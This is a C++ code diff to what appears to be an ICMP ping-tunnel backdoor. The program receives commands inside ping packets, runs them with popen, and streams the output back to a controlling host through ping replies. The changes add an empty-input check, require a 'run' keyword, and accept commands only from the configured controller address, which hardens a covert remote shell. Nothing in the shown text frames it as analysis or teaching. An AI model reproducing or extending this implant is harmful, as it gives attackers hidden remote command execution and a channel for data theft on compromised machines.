@@ -142,6 +142,9 @@ std::vector<std::string> split_input(std::string &input)
 
 void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
 {
+    if (size == 0)
+        return;
+
     char *cmd_str_ = (char *)buf;
     std::string cmd_str(cmd_str_, size);
     auto split = split_input(cmd_str);
@@ -156,24 +159,27 @@ void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size
         }
     }
 
-    std::cout << "Running: " << command << "\n";
-    FILE *fp = popen(command.c_str(), "r");
-    uint8_t out[512];
-    if (fp == NULL)
+    if (split.at(0).compare("run") == 0)
     {
-        return;
+        std::cout << "Running: " << command << "\n";
+        FILE *fp = popen(command.c_str(), "r");
+        uint8_t out[512];
+        if (fp == NULL)
+        {
+            return;
+        }
+
+        size_t nbytes;
+        do
+        {
+            nbytes = fread(out, 1, sizeof(out), fp);
+            send_ping(sockfd, dst, out, nbytes);
+        } while (nbytes == sizeof(out));
+
+        send_ping(sockfd, dst, NULL, 0);
+
+        pclose(fp);
     }
-
-    size_t nbytes;
-    do
-    {
-        nbytes = fread(out, 1, sizeof(out), fp);
-        send_ping(sockfd, dst, out, nbytes);
-    } while (nbytes == sizeof(out));
-
-    send_ping(sockfd, dst, NULL, 0);
-
-    pclose(fp);
 }
 
 void usage(int exit_code)
@@ -219,7 +225,10 @@ int main(int argc, char **argv)
         uint8_t buf[1024];
         std::string src_ip;
         long nbytes = receive_ping(sockfd, src_ip, buf, sizeof(buf));
-        parse_command(sockfd, dest_ip, buf, nbytes);
+        if (src_ip == dest_ip)
+        {
+            parse_command(sockfd, dest_ip, buf, nbytes);
+        }
 
         usleep(1000000);
     }
